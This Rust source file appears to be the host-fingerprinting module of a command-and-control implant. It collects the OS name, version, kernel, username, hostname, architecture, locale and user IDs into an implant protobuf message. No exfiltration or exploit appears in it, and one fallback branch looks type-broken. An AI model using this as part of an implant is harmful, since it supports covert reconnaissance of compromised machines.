use cfg_if::cfg_if;
use sysinfo::System;
use crate::protobuf::implantpb;

pub fn name() -> String {
    System::name().unwrap()
}

pub fn release() -> String {
    System::kernel_version().unwrap()
}

pub fn username() -> String {
    whoami::username()
}

pub fn version() -> String {
    System::os_version().unwrap()
}

pub fn hostname() -> String {
    System::host_name().unwrap()
}

pub fn arch() -> String {
    System::cpu_arch().unwrap()
}

#[allow(deprecated)]
pub fn language() -> String {
    whoami::lang().collect::<Vec<String>>().join(",")
}

pub fn getuid() -> String {
    cfg_if!{
        if #[cfg(target_family = "unix")]{
            let uid = unsafe {libc::getuid()};
            uid.to_string()
        } else if #[cfg(target_family = "windows")]{
            crate::win::kit::get_sid().unwrap()
        } else {
            None
        }
    }
}

pub fn gid() -> String {
    #[cfg(target_family = "unix")]{
       return unsafe { libc::getgid().to_string() };
    }
    "".to_string()
}


pub fn default_os() -> Option<implantpb::Os> {
    Some(implantpb::Os {
        name: name(),
        version: version(),
        release: release(),
        arch: arch(),
        username: username(),
        hostname: hostname(),
        locale: language(),
    })
}